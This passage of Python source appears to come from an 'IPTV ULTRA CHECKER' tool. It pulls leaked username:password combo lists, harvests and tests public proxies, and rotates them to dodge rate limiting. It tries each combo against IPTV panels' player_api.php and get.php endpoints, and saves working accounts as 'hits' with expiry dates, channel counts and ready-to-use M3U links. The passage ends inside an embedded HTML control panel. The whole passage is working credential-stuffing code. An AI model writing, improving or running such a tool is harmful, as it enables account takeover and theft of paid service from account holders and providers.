        if not p.startswith("http"): p = "http://" + p
        clean_panels.append(p.rstrip("/"))

    real_combos = fetch_massive_combos()
    creds = []
    sources_ok = 1 if real_combos else 0
    sources_fail = 0 if real_combos else 1

    with open(FETCHED_FILE, "w", encoding="utf-8") as f:
        for line in real_combos:
            f.write(line + "\n")
            try:
                u, p = line.split(":", 1)
                creds.append({"user": u, "pass": p})
            except: pass

    out_creds = creds if MAX_CREDS_PER_RUN is None else creds[:MAX_CREDS_PER_RUN]
    return {"panels": [], "creds": out_creds,
            "sources_ok": sources_ok, "sources_fail": sources_fail}

def _normalize_proxy_line(line):
    if not line: return None
    line=line.strip()
    if not line or line.startswith("#"): return None
    scheme=None
    if "://" in line:
        scheme,line=line.split("://",1); scheme=scheme.strip().lower()
        if scheme not in ("http","https","socks4","socks5"): scheme=None
    if not scheme: scheme="http"
    if "@" not in line:
        parts=line.split(":")
        if len(parts)==4 and parts[1].isdigit(): line=f"{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts)==2 and parts[1].isdigit():
            host,port=parts
            if not is_valid_ip(host) or not port_ok(int(port)): return None
            line=f"{host}:{port}"
        else: return None
    hp=line.split("@",1)[-1]
    if ":" not in hp: return None
    _,port=hp.rsplit(":",1)
    if not port.isdigit() or not port_ok(int(port)): return None
    return f"{scheme}://{line}"

def _fetch_url(url,timeout):
    return requests.get(url,timeout=timeout, headers=_rand_headers(), verify=VERIFY_SSL,allow_redirects=True)

def _extract_json_proxies(data,scheme):
    found=set(); items=[]
    if isinstance(data,dict) and isinstance(data.get("data"),list): items=data["data"]
    elif isinstance(data,list): items=data
    for it in items:
        if isinstance(it,dict):
            ip=it.get("ip") or it.get("ipAddress"); port=it.get("port")
            if ip and port and is_valid_ip(str(ip)):
                try: p=int(port)
                except: continue
                if port_ok(p): found.add(f"{scheme}://{ip}:{p}")
    return found

def _extract_html_proxies(html):
    found=set()
    if HAS_BS4:
        try:
            soup=BeautifulSoup(html,"html.parser")
            for tag in soup.find_all(["td","code","pre","span","li"]):
                found.update(PROXY_REGEX.findall(tag.get_text(" ",strip=True)))
        except Exception as e: log_exc("bs4_parse",e)
    if not found: found=set(PROXY_REGEX.findall(html))
    return {f"{ip}:{port}" for ip,port in found}

def fetch_from_source(url,timeout=12):
    scheme=scheme_for(url); proxies=set()
    try:
        r=_fetch_url(url,timeout)
        if r.status_code!=200: return proxies
        ctype=r.headers.get("Content-Type","").lower(); text=r.text
        if "json" in ctype or "/api/" in url:
            try: proxies.update(_extract_json_proxies(r.json(),scheme))
            except json.JSONDecodeError: pass
        if not proxies:
            if "html" in ctype or url.endswith("/"):
                for raw in _extract_html_proxies(text): proxies.add(f"{scheme}://{raw}")
            else:
                for ip,port in PROXY_REGEX.findall(text):
                    if is_valid_ip(ip) and port_ok(int(port)): proxies.add(f"{scheme}://{ip}:{port}")
    except requests.RequestException as e: log_exc("fetch_source",e,url)
    return proxies

def ensure_socks_support(proxy_list):
    global HAS_SOCKS
    if not any(p.startswith("socks") for p in proxy_list): return proxy_list
    if HAS_SOCKS: return proxy_list
    if _pip_install(["PySocks"]):
        try: import socks; HAS_SOCKS=True; return proxy_list
        except ImportError: pass
    return [p for p in proxy_list if not p.startswith("socks")]

def save_alive_proxies(alive_list,filepath=ALIVE_CACHE_FILE):
    if not alive_list: return
    try:
        ts=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"); tmp=filepath+".tmp"
        with open(tmp,"w",encoding="utf-8") as f:
            f.write(f"# Alive proxies - v{TOOL_VERSION}\n# {ts} | Count: {len(alive_list)}\n")
            for p in alive_list: f.write(p+"\n")
            f.flush()
            try: os.fsync(f.fileno())
            except OSError: pass
        os.replace(tmp,filepath)
    except OSError as e: log_exc("save_alive",e,filepath)

def load_alive_proxies(filepath=ALIVE_CACHE_FILE):
    if not os.path.isfile(filepath): return []
    try:
        out = []
        with open(filepath, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"): continue
                out.append(line)
        return out
    except OSError as e:
        log_exc("load_alive", e, filepath); return []

def tcp_alive(proxy,timeout=PROXY_TCP_TIMEOUT):
    try:
        hp=proxy.split("://",1)[-1].split("@")[-1]; host,port=hp.rsplit(":",1)
        with socket.create_connection((host,int(port)),timeout=timeout): return True
    except Exception: return False

PROXY_HTTP_ENDPOINTS=["http://api.ipify.org?format=json","http://icanhazip.com/",
                      "http://ifconfig.me/ip","http://ipinfo.io/ip"]
def http_alive(proxy,timeout=PROXY_HTTP_TIMEOUT):
    pm={"http":proxy,"https":proxy}
    for url in PROXY_HTTP_ENDPOINTS:
        try:
            r=requests.get(url,proxies=pm,timeout=timeout,verify=VERIFY_SSL,allow_redirects=True)
            if r.status_code==200 and (r.text or "").strip(): return True
        except requests.RequestException: continue
        except Exception: continue
    return False

def test_many(func,items,threads,timeout):
    results=[]
    if not items: return results
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs={ex.submit(func,p,timeout):p for p in items}
        for f in as_completed(futs):
            if STOP_EVENT.is_set():
                for x in futs:
                    if not x.done(): x.cancel()
                break
            try:
                if f.result(): results.append(futs[f])
            except Exception as e: log_exc("test_many",e)
    return results

def extract_alive_unlimited(sample=25000, rounds=10):
    tested=set(); alive=[]
    for r in range(rounds):
        if STOP_EVENT.is_set(): break
        if not QUIET: print(f"\n[+] Round {r+1}/{rounds} - alive={len(alive)} (no cap)")
        fetched=set()
        with ThreadPoolExecutor(max_workers=100) as ex:
            futs={ex.submit(fetch_from_source,u,12):u for u in SOURCES}
            for f in as_completed(futs):
                if STOP_EVENT.is_set(): break
                try: fetched.update(f.result())
                except Exception as e: log_exc("fetch_round",e)
        fetched-=tested
        if not fetched:
            if not QUIET: print("[!] No new proxies")
            break
        fetched=ensure_socks_support(list(fetched)); random.shuffle(fetched)
        batch=fetched[:sample]; tested.update(batch)
        if not QUIET: print(f"[+] Round {r+1}: testing {len(batch)}")
        t0=time.time()
        tcp_ok=test_many(tcp_alive,batch,PROXY_TCP_THREADS,PROXY_TCP_TIMEOUT)
        if not QUIET: print(f"[+] TCP ok: {len(tcp_ok)}/{len(batch)} in {time.time()-t0:.1f}s")
        t0=time.time(); http_ok=[]
        with ThreadPoolExecutor(max_workers=PROXY_HTTP_THREADS) as ex:
            futs={ex.submit(http_alive,p,PROXY_HTTP_TIMEOUT):p for p in tcp_ok}
            for f in as_completed(futs):
                if STOP_EVENT.is_set():
                    for x in futs:
                        if not x.done(): x.cancel()
                    break
                try:
                    if f.result(): http_ok.append(futs[f])
                except Exception as e: log_exc("http_alive",e)
        alive.extend(http_ok); alive=list(dict.fromkeys(alive))
        if not QUIET: print(f"[+] HTTP alive: +{len(http_ok)} -> total {len(alive)} in {time.time()-t0:.1f}s")
    return alive

class ProxyPool:
    def __init__(self,proxies):
        self._lock=threading.Lock(); self._list=list(proxies); self._idx=0
        self._fails={p:0 for p in self._list}; self._cooldown={}
    def get(self):
        if not self._list: return None
        with self._lock:
            now=time.time(); n=len(self._list)
            for _ in range(n):
                p=self._list[self._idx%n]; self._idx+=1
                if self._cooldown.get(p,0)>now: continue
                return p
            p=min(self._cooldown,key=self._cooldown.get,default=self._list[0])
            self._cooldown[p]=0; return p
    def report_fail(self,proxy):
        if not proxy: return
        with self._lock:
            self._fails[proxy]=self._fails.get(proxy,0)+1
            self._cooldown[proxy]=time.time()+min(60,5*self._fails[proxy])
    def report_ok(self,proxy):
        if not proxy: return
        with self._lock: self._fails[proxy]=0; self._cooldown[proxy]=0
    def __len__(self): return len(self._list)

proxy_pool=ProxyPool([]); use_proxies=False; _pool_lock=threading.Lock()
def set_pool(proxies):
    global proxy_pool,use_proxies
    with _pool_lock:
        proxy_pool=ProxyPool(proxies); use_proxies=len(proxy_pool)>0

SUS_U={"user","password","test","demo","admin","guest","abcd","1234","0000","username","pass","default","login","root","temp","sample","example"}
SUS_P={"user","password","test","demo","admin","guest","abcd","1212","1234","0000","pass","t2022","default","login","root","temp","sample","example"}
def _is_suspicious_creds(u,p):
    uu,pp=u.strip().lower(),p.strip().lower()
    return uu in SUS_U or pp in SUS_P or (uu==pp and len(uu)<8)

_tls = threading.local()
def _get_session():
    s = getattr(_tls, "session", None)
    if s is None:
        s = requests.Session(); s.headers.update(_rand_headers()); _tls.session = s
    return s

def _build_proxies(proxy): return {"http":proxy,"https":proxy} if proxy else None

_last_latency = {}
def _adaptive_timeout(host):
    lat = _last_latency.get(host, 0)
    if lat <= 0: return REQ_TIMEOUT
    if lat > 6000: return (2.5, 5.0)
    if lat < 800: return (1.0, 2.0)
    return REQ_TIMEOUT

def _try_base(panel, user, password, proxy=None, timeout=None):
    s = _get_session()
    if timeout is None: timeout = _adaptive_timeout(panel)
    url = f"http://{panel}/player_api.php?username={user}&password={password}"
    t0 = time.time()
    try:
        r = s.get(url, proxies=_build_proxies(proxy), timeout=timeout,
                  verify=VERIFY_SSL, allow_redirects=True)
        _last_latency[panel] = int((time.time() - t0) * 1000)
        if r.status_code == 200:
            try: data = r.json()
            except json.JSONDecodeError: return ("badjson", None, "http")
            if isinstance(data, dict):
                if use_proxies and proxy: proxy_pool.report_ok(proxy)
                return ("ok", data, "http")
            return ("badjson", None, "http")
        if use_proxies and proxy and r.status_code in (403, 429, 512):
            proxy_pool.report_fail(proxy)
        if r.status_code in (401, 403): return ("auth_fail", None, "http")
        return (f"http{r.status_code}", None, "http")
    except requests.RequestException as e:
        try:
            url2 = url.replace("http://","https://",1)
            r = s.get(url2, proxies=_build_proxies(proxy), timeout=timeout,
                      verify=VERIFY_SSL, allow_redirects=True)
            _last_latency[panel] = int((time.time() - t0) * 1000)
            if r.status_code == 200:
                try:
                    data = r.json()
                    if isinstance(data, dict):
                        if use_proxies and proxy: proxy_pool.report_ok(proxy)
                        return ("ok", data, "https")
                except json.JSONDecodeError:
                    return ("badjson", None, "https")
            if r.status_code in (401, 403): return ("auth_fail", None, "https")
            return (f"http{r.status_code}", None, "https")
        except Exception:
            if use_proxies and proxy: proxy_pool.report_fail(proxy)
            return (type(e).__name__, None, "http")

def _check_m3u(panel, user, password, timeout=REQ_TIMEOUT, proxy=None):
    s = _get_session()
    try:
        r = s.get(f"http://{panel}/get.php?username={user}&password={password}&type=m3u_plus",
                  proxies=_build_proxies(proxy), timeout=timeout, verify=VERIFY_SSL,
                  headers={"Range":"bytes=0-512"}, allow_redirects=True)
        return (r.status_code == 200 and (r.text or "").lstrip().startswith("#EXTM3U"))
    except Exception:
        return False

def _verify_user_info(data):
    if not isinstance(data,dict): return False
    ui=data.get("user_info") or {}
    if not ui: return False
    has_auth = "auth" in ui
    has_status = "status" in ui
    has_exp = "exp_date" in ui
    if sum([has_auth, has_status, has_exp]) < 2:
        return False
    auth_ok = False
    try:
        if has_auth and int(ui.get("auth",0))==1: auth_ok = True
    except: pass
    status_val = str(ui.get("status","")).strip().lower()
    status_ok = status_val in ("active","enabled","1","true")
    status_bad = status_val in ("banned","disabled","expired","suspended")
    exp_ok = False
    exp_present = False
    exp = ui.get("exp_date")
    if exp and str(exp) not in ("null","None","0",""):
        exp_present = True
        try: exp_ok = int(exp) > time.time()
        except: exp_ok = False
    if status_bad: return False
    if not (auth_ok or status_ok or (exp_present and exp_ok)):
        return False
    return True

def parse_expiry(exp_raw):
    if exp_raw is None: return "Unlimited",None
    s=str(exp_raw).strip()
    if not s or s.lower() in ("null","none","0",""): return "Unlimited",None
    try: ts=int(float(s))
    except: return "Unlimited",None
    if ts<=0: return "Unlimited",None
    try: dt=datetime.datetime.fromtimestamp(ts, tz=datetime.timezone.utc)
    except: return "Unlimited",None
    now = datetime.datetime.now(datetime.timezone.utc)
    days=max(0,int((dt-now).total_seconds()//86400))
    return dt.strftime("%Y-%m-%d %H:%M:%S"),days

# ---------- v7.3.6 counts fix ----------
_COUNTS_CACHE = {}
_COUNTS_CACHE_LOCK = threading.Lock()

def _extract_count_from_payload(d):
    """Return (count, reason). count is int or None."""
    if isinstance(d, list):
        return len(d), "list"
    if isinstance(d, dict):
        # common keys used by various panels
        for key in ("data","available_channels","streams","items",
                    "live_streams","vod_streams","series","channels","results"):
            v = d.get(key)
            if isinstance(v, list):
                return len(v), f"key:{key}"
            if isinstance(v, dict):
                # some panels nest { "channels": { "1": {...}, ... } }
                return len(v), f"key:{key}:dict"
        # sometimes {"streams": N} or {"count": N}
        for key in ("count","total","total_items","num"):
            v = d.get(key)
            if isinstance(v, (int, float)):
                return int(v), f"num:{key}"
        # error payload
        if "error" in d or "message" in d:
            return None, f"error:{str(d.get('error') or d.get('message'))[:60]}"
        return None, "dict_no_known_key"
    return None, f"type:{type(d).__name__}"

def _fetch_one_count(panel, user, password, action, proxy=None):
    s = _get_session()
    url = f"http://{panel}/player_api.php?username={user}&password={password}&action={action}"
    last_reason = "no_attempt"
    for attempt in range(COUNT_RETRIES):
        if STOP_EVENT.is_set(): return None, "stopped"
        try:
            r = s.get(url, proxies=_build_proxies(proxy),
                      timeout=COUNT_TIMEOUT, verify=VERIFY_SSL, allow_redirects=True)
            if r.status_code == 200:
                try:
                    d = r.json()
                except json.JSONDecodeError:
                    last_reason = "badjson"
                    time.sleep(0.2); continue
                cnt, reason = _extract_count_from_payload(d)
                if cnt is not None:
                    return cnt, reason
                last_reason = reason
                # don't retry on a clear server-side error payload
                if reason.startswith("error:"):
                    return None, reason
            else:
                last_reason = f"http{r.status_code}"
            if attempt + 1 < COUNT_RETRIES:
                time.sleep(0.3 + attempt * 0.4)
        except requests.Timeout:
            last_reason = "timeout"
            if attempt + 1 < COUNT_RETRIES:
                time.sleep(0.5)
        except requests.RequestException as e:
            last_reason = type(e).__name__
            if attempt + 1 < COUNT_RETRIES:
                time.sleep(0.3)
    return None, last_reason

def _fetch_counts(panel, user, password, proxy=None):
    """
    v7.3.6: serial fetch with small gap, longer timeout, up to 3 retries.
    Returns {"live": int|None, "vod": int|None, "series": int|None,
             "reasons": {"live": str, "vod": str, "series": str}}
    """
    cache_key = f"{panel}|{user}"
    with _COUNTS_CACHE_LOCK:
        cached = _COUNTS_CACHE.get(cache_key)
    if cached is not None:
        return cached

    result = {"live": None, "vod": None, "series": None,
              "reasons": {"live": "", "vod": "", "series": ""}}
    for key, action in (("live", "get_live_streams"),
                        ("vod", "get_vod_streams"),
                        ("series", "get_series")):
        cnt, reason = _fetch_one_count(panel, user, password, action, proxy)
        result[key] = cnt
        result["reasons"][key] = reason or ""
        time.sleep(COUNT_GAP)
        if STOP_EVENT.is_set():
            break

    # cache only when all three succeeded (avoid caching transient failures)
    if all(result[k] is not None for k in ("live", "vod", "series")):
        with _COUNTS_CACHE_LOCK:
            _COUNTS_CACHE[cache_key] = result
    return result

def do_check(panel,user,password,timeout=REQ_TIMEOUT,with_counts=True):
    global ENABLE_M3U_FALLBACK
    try:
        proxy = proxy_pool.get() if use_proxies else None
        status, data, scheme_used = _try_base(panel, user, password, proxy, timeout)
        if status != "ok" or not _verify_user_info(data):
            if ENABLE_M3U_FALLBACK and (status in ("auth_fail", "badjson") or status.startswith("http")):
                if _check_m3u(panel, user, password, timeout, proxy):
                    return {
                        "host":panel,"user":user,"pass":password,
                        "expiry":"Unknown (M3U only)","days_left":None,
                        "status":"Active","active_cons":"?","max_connections":"?",
                        "server_ip":panel,"timezone":"—",
                        "live":None,"vod":None,"series":None,
                        "verified":"m3u","saturated":False,
                        "scheme_used": scheme_used,
                        "reason":"player_api failed but m3u alive",
                        "counts_reason":{"live":"m3u_only","vod":"m3u_only","series":"m3u_only"},
                        "m3u":f"{scheme_used}://{panel}/get.php?username={user}&password={password}&type=m3u_plus"
                    }
            return {"_fail": True, "reason": status}
        ui=data.get("user_info") or {}; si=data.get("server_info") or {}
        exp_str,days_left=parse_expiry(ui.get("exp_date"))
        if exp_str != "Unlimited" and days_left == 0:
            counts = {"live": 0, "vod": 0, "series": 0,
                      "reasons": {"live":"expired","vod":"expired","series":"expired"}}
        else:
            if with_counts:
                counts = _fetch_counts(panel,user,password,proxy)
            else:
                counts = {"live":None,"vod":None,"series":None,
                          "reasons":{"live":"disabled","vod":"disabled","series":"disabled"}}
        try:
            ac = int(ui.get("active_cons","0")); mc = int(ui.get("max_connections","0"))
            saturated = (mc > 0 and ac >= mc)
        except: saturated = False
        return {"host":panel,"user":user,"pass":password,
                "expiry":exp_str,"days_left":days_left,
                "status":str(ui.get("status","active")).capitalize(),
                "active_cons":ui.get("active_cons","0"),
                "max_connections":ui.get("max_connections","?"),
                "server_ip":f"{si.get('url',panel)}:{si.get('port','')}".rstrip(":"),
                "timezone":si.get("timezone","—"),
                "live":(counts or {}).get("live"),
                "vod":(counts or {}).get("vod"),
                "series":(counts or {}).get("series"),
                "counts_reason":(counts or {}).get("reasons", {}),
                "verified":ui.get("_verified_via","player_api"),
                "saturated": saturated,
                "scheme_used": scheme_used,
                "reason": "ok",
                "m3u":f"{scheme_used}://{panel}/get.php?username={user}&password={password}&type=m3u_plus"}
    except Exception as e:
        log_exc("do_check",e,f"{panel} {user}"); return {"_fail": True, "reason": "exception"}

def format_hit_block(hit,index):
    ts=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    portal=f"http://{hit['host']}"
    real=f"{hit.get('scheme_used','http')}://{hit['server_ip'] or hit['host']}"
    live="?" if hit.get("live") is None else str(hit["live"])
    vod ="?" if hit.get("vod") is None else str(hit["vod"])
    ser ="?" if hit.get("series") is None else str(hit["series"])
    dl  = "-" if hit.get("days_left") is None else str(hit["days_left"])
    return "\n".join([
        f"── Hit #{index} @ {ts} ───",
        "╔══════════════════════════════════════════╗",
        f"║ 🚀 {TOOL_NAME} — {TOOL_AUTHOR} ║",
        "║              ✅  NEW HIT                 ║",
        "╚══════════════════════════════════════════╝",
        f"├─🎯 Portal     ➤ {portal}",
        f"├─🛰  Real      ➤ {real}",
        f"├─👤 Username   ➤ {hit['user']}",
        f"├─🔑 Password   ➤ {hit['pass']}",
        f"├─⏰ Expiry     ➤ {hit['expiry']}",
        f"├─📅 Days Left  ➤ {dl}",
        f"├─🟢 Active Con ➤ {hit['active_cons']}",
        f"├─🔵 Max Con    ➤ {hit['max_connections']}",
        f"├─⚙  Status     ➤ {hit['status']}",
        f"├─🔎 Verified   ➤ {hit['verified']}",
        f"├─🌍 TimeZone   ➤ {hit['timezone']}",
        f"├─📺 Live       ➤ {live}",
        f"├─🎬 VOD        ➤ {vod}",
        f"├─📼 Series     ➤ {ser}",
        f"├─🚦 Saturated  ➤ {hit.get('saturated', False)}",
        f"├─🔗 M3U URL    ➤ {hit['m3u']}",
        f"├─✍  Checked by ➤ {TOOL_AUTHOR}",""])

def format_hits_txt(hits):
    return "\n".join(format_hit_block(h,i+1) for i,h in enumerate(hits))

def _host_to_filename(panel):
    s=(panel or "").strip().lower()
    s=re.sub(r"^https?://","",s); s=s.split("/",1)[0]
    s=s.replace(":","_"); s=re.sub(r"[^a-z0-9._-]","_",s)
    s=re.sub(r"_+","_",s).strip("_")
    return s or "unknown_host"

class ResultSaver:
    def __init__(self,output_dir,panel):
        self.output_dir=output_dir; self.panel=panel
        self.base=_host_to_filename(panel)
        os.makedirs(output_dir,exist_ok=True)
        self._lock=threading.Lock(); self._hits=0
        self.session_ts=datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        self.raw_file=os.path.join(output_dir,f"{self.base}_RAW.txt")
        self.all_file=os.path.join(output_dir,f"{self.base}_ALL.txt")
        self.main_file=os.path.join(output_dir,f"{self.base}_{self.session_ts}.txt")
        self.index_file=os.path.join(output_dir,f"{self.base}_index.txt")
        self.jsonl_file=os.path.join(output_dir,HITS_JSONL)
        self.csv_file=os.path.join(output_dir,HITS_CSV)
        self._seen=set()
        self._init_file(self.raw_file,f"RAW HITS - user:pass | host={panel}")
        self._init_file(self.all_file,f"ALL RESULTS | host={panel}")
        self._init_file(self.main_file,f"HITS | host={panel} | session={self.session_ts}")
        self._init_file(self.index_file,f"INDEX | host={panel} | session={self.session_ts}")
    def _init_file(self,path,desc):
        hdr=(f"# {'='*60}\n# {TOOL_NAME} v{TOOL_VERSION}\n# DEV BY {TOOL_AUTHOR}\n"
             f"# {desc}\n# Started: {datetime.datetime.now():%Y-%m-%d %H:%M:%S}\n# {'='*60}\n")
        try:
            with open(path,"w",encoding="utf-8") as f:
                f.write(hdr); f.flush()
                try: os.fsync(f.fileno())
                except OSError: pass
        except OSError as e: log_exc("init_file",e,path)
    def _append_flush(self,path,text):
        try:
            with open(path,"a",encoding="utf-8") as f:
                f.write(text); f.flush()
                try: os.fsync(f.fileno())
                except OSError: pass
        except OSError as e: log_exc("append_flush",e,path)
    def save_hit(self,combo,hit_dict):
        with self._lock:
            key = f"{hit_dict['host']}|{hit_dict['user']}|{hit_dict['pass']}"
            if key in self._seen: return False
            self._seen.add(key)
            if not is_hit_new(hit_dict['host'], hit_dict['user'], hit_dict['pass']):
                return False
            self._hits+=1; n=self._hits
            self._append_flush(self.main_file,format_hit_block(hit_dict,n)+"\n")
            self._append_flush(self.raw_file,combo+"\n---\n")
            self._append_flush(self.all_file,f"[{datetime.datetime.now():%Y-%m-%d %H:%M:%S}] {combo} | HIT\n")
            try:
                with open(self.jsonl_file,"a",encoding="utf-8") as f:
                    f.write(json.dumps(hit_dict,ensure_ascii=False)+"\n")
            except OSError as e: log_exc("jsonl",e,self.jsonl_file)
            try:
                write_header = not os.path.isfile(self.csv_file) or os.path.getsize(self.csv_file)==0
                with open(self.csv_file,"a",encoding="utf-8",newline="") as f:
                    w = csv.writer(f)
                    if write_header:
                        w.writerow(["host","user","pass","expiry","days_left","status",
                                    "active_cons","max_connections","server_ip","timezone",
                                    "live","vod","series","verified","saturated","scheme_used","m3u"])
                    w.writerow([hit_dict.get(k,"") for k in
                                ["host","user","pass","expiry","days_left","status",
                                 "active_cons","max_connections","server_ip","timezone",
                                 "live","vod","series","verified","saturated","scheme_used","m3u"]])
            except OSError as e: log_exc("csv",e,self.csv_file)
            save_hit_db(hit_dict['host'], hit_dict['user'], hit_dict['pass'],
                        json.dumps(hit_dict,ensure_ascii=False))
            if n % 10 == 0:
                self._append_flush(self.index_file, f"hits={n} at {datetime.datetime.now():%Y-%m-%d %H:%M:%S}\n")
            return True
    @property
    def hits(self): return self._hits
    @property
    def main_filename(self): return os.path.basename(self.main_file)

HTML_UI = r"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>IPTV ULTRA CHECKER AISSA_TOUMI v7.3.6</title>
<style>
:root{--bg:#050a08;--bg2:#08110d;--panel:#0a1a13;--panel2:#0d2219;
--emerald:#22c55e;--neon:#4ade80;--cyan:#22d3ee;--orange:#fb923c;
--red:#ef4444;--yellow:#facc15;--dim:#6b7280;--line:#14332a;--text:#d1fae5;
--glow:0 0 8px #22c55e88,0 0 22px #22c55e44}
*{box-sizing:border-box;margin:0;padding:0}
body{background:linear-gradient(rgba(0,0,0,.75),rgba(0,0,0,.85)),url('/background.jpg') center/cover fixed no-repeat,radial-gradient(1200px 600px at 20% -10%,rgba(34,211,238,.08),transparent 60%),radial-gradient(900px 500px at 90% 110%,rgba(34,197,94,.06),transparent 60%),var(--bg);color:var(--text);font-family:"JetBrains Mono","Fira Code",Consolas,monospace;font-size:13px;line-height:1.45;min-height:100vh;padding:20px;letter-spacing:.2px}
.wrap{max-width:1100px;margin:0 auto}
.top-nav{display:flex;border:1px solid var(--line);border-radius:8px;overflow:hidden;margin-bottom:20px;background:rgba(10,26,19,.8)}
.nav-item{flex:1;text-align:center;padding:12px;color:var(--dim);cursor:pointer;font-size:12px;font-weight:700;letter-spacing:1px;text-transform:uppercase;border-right:1px solid var(--line);transition:.2s}
.nav-item:last-child{border-right:none}.nav-item.active{color:var(--emerald);background:rgba(34,197,94,.1);text-shadow:var(--glow)}.nav-item:hover{color:var(--text)}
.status-bar{display:flex;justify-content:space-between;align-items:center;background:rgba(8,17,13,.9);border:1px solid var(--line);border-radius:8px;padding:10px 16px;margin-bottom:16px;font-size:11px;color:var(--dim)}
.status-indicator{display:flex;align-items:center;gap:8px}.dot{width:8px;height:8px;border-radius:50%;background:var(--red)}.dot.connected{background:var(--emerald);box-shadow:var(--glow)}
.card{background:rgba(10,26,19,.88);border:1px solid var(--line);border-radius:10px;padding:16px;margin-bottom:16px;backdrop-filter:blur(4px);position:relative}
.card-title{position:absolute;top:-10px;left:16px;background:var(--bg);padding:0 8px;color:var(--cyan);font-size:11px;font-weight:700;letter-spacing:1px;text-transform:uppercase}
.card-title.orange{color:var(--orange)}.card-title.green{color:var(--emerald)}
label{display:block;color:var(--dim);font-size:11px;letter-spacing:1px;margin:12px 0 6px;text-transform:uppercase;font-weight:700}
input,textarea,select{width:100%;background:rgba(8,17,13,.85);border:1px solid var(--line);color:var(--text);padding:10px 12px;font-family:inherit;font-size:12px;outline:none;border-radius:6px;transition:.15s}
input:focus,textarea:focus,select:focus{border-color:var(--emerald);box-shadow:var(--glow)}
textarea{resize:vertical}
select{appearance:none;background-image:url("data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22292.4%22%20height%3D%22292.4%22%3E%3Cpath%20fill%3D%22%2322c55e%22%20d%3D%22M287%2069.4a17.6%2017.6%200%200%200-13-5.4H18.4c-5%200-9.3%201.8-12.9%205.4A17.6%2017.6%200%200%200%200%2082.2c0%205%201.8%209.3%205.4%2012.9l128%20127.9c3.6%203.6%207.8%205.4%2012.8%205.4s9.2-1.8%2012.8-5.4L287%2095c3.5-3.5%205.4-7.8%205.4-12.8%200-5-1.9-9.2-5.5-12.8z%22%2F%3E%3C%2Fsvg%3E");background-repeat:no-repeat;background-position:right 12px top 50%;background-size:10px auto}
.row{display:grid;grid-template-columns:1fr 1fr;gap:16px}.row3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px}
@media(max-width:768px){.row,.row3{grid-template-columns:1fr}}
.btn{background:transparent;border:1px solid var(--emerald);color:var(--emerald);padding:10px 16px;font-family:inherit;font-size:12px;letter-spacing:1px;cursor:pointer;transition:.15s;text-transform:uppercase;border-radius:6px;font-weight:700;display:inline-flex;align-items:center;justify-content:center;gap:8px}
.btn:hover{background:rgba(34,197,94,.15);box-shadow:var(--glow)}.btn:disabled{opacity:.3;cursor:not-allowed;box-shadow:none;background:transparent}
.btn.cy{border-color:var(--cyan);color:var(--cyan)}.btn.cy:hover{background:rgba(34,211,238,.15);box-shadow:0 0 8px #22d3ee88}
.btn.or{border-color:var(--orange);color:var(--orange)}.btn.or:hover{background:rgba(251,146,60,.15);box-shadow:0 0 8px #fb923c88}
.btn.rd{border-color:var(--red);color:var(--red)}.btn.rd:hover{background:rgba(239,68,68,.15);box-shadow:0 0 8px #ef444488}
.stats{display:grid;grid-template-columns:repeat(6,1fr);gap:10px;margin-top:16px}
.stat{background:rgba(13,34,25,.9);border:1px solid var(--line);border-radius:8px;padding:12px;text-align:center}
.stat .k{color:var(--dim);font-size:10px;letter-spacing:1.5px;font-weight:700}.stat .v{font-size:22px;font-weight:800;margin-top:4px}
.stat.hits .v{color:var(--neon)}.stat.fails .v{color:var(--red)}.stat.chk .v{color:var(--cyan)}.stat.rem .v{color:var(--orange)}.stat.tot .v{color:var(--emerald)}.stat.spd .v{color:var(--yellow)}
.progress-wrap{display:flex;align-items:center;gap:12px;margin-top:16px}
.progress{flex:1;height:6px;background:var(--bg2);border:1px solid var(--line);border-radius:4px;overflow:hidden}
.progress .bar{height:100%;width:0%;background:linear-gradient(90deg,var(--emerald),var(--cyan));transition:width .2s}
.progress-text{font-size:11px;color:var(--dim);min-width:40px}
.log-container{background:rgba(2,8,6,.95);border:1px solid var(--line);border-radius:8px;height:250px;overflow-y:auto;padding:12px;font-size:11px;line-height:1.6;scrollbar-width:thin;scrollbar-color:var(--emerald) transparent}
.log-container::-webkit-scrollbar{width:6px}.log-container::-webkit-scrollbar-thumb{background:var(--emerald);border-radius:3px}
.log-line{white-space:pre-wrap;word-break:break-all;margin-bottom:2px;font-family:monospace}
.log-line.ok{color:var(--neon)}.log-line.err{color:var(--red)}.log-line.info{color:var(--cyan)}.log-line.warn{color:var(--yellow)}
.hit-frame{height:400px;overflow-y:auto;border:1px solid var(--emerald);border-radius:8px;background:rgba(5,15,10,.8);padding:12px;scrollbar-width:thin}
.hit-item{background:rgba(13,34,25,.92);border:1px solid var(--line);border-radius:8px;padding:12px;margin-bottom:10px;position:relative}
.hit-item .idx{position:absolute;top:-8px;left:12px;background:var(--bg);padding:0 8px;color:var(--emerald);font-size:10px;border:1px solid var(--emerald);border-radius:4px;font-weight:700}
.kv{display:grid;grid-template-columns:100px 1fr auto;gap:4px 12px;margin-top:6px;align-items:center}
.kv .k{color:var(--dim);font-size:10px;letter-spacing:1px}.kv .v{color:var(--text);word-break:break-all;font-size:11px}
.copy{background:transparent;border:1px solid var(--line);color:var(--cyan);padding:2px 6px;font-size:9px;border-radius:4px;cursor:pointer}.copy:hover{background:rgba(34,211,238,.1)}
.hidden{display:none !important}
.dropzone{border:1px dashed var(--line);padding:16px;text-align:center;color:var(--dim);cursor:pointer;margin-top:8px;border-radius:6px;transition:.15s}.dropzone:hover{border-color:var(--cyan);color:var(--cyan)}
</style></head>
<body><div class="wrap">
<div class="top-nav">
  <div class="nav-item active">📡 SCANNER</div>
  <div class="nav-item">🌐 HOST SCANNER</div>
  <div class="nav-item">ℹ️ ABOUT ME</div>
</div>
<div class="status-bar">
  <div class="status-indicator"><div class="dot" id="statusDot"></div> <span id="statusText">DISCONNECTED</span></div>
  <div style="display:flex;gap:10px;align-items:center">
    <button class="btn cy" id="btnToggleM3U" style="padding:4px 10px;font-size:10px">M3U: OFF</button>
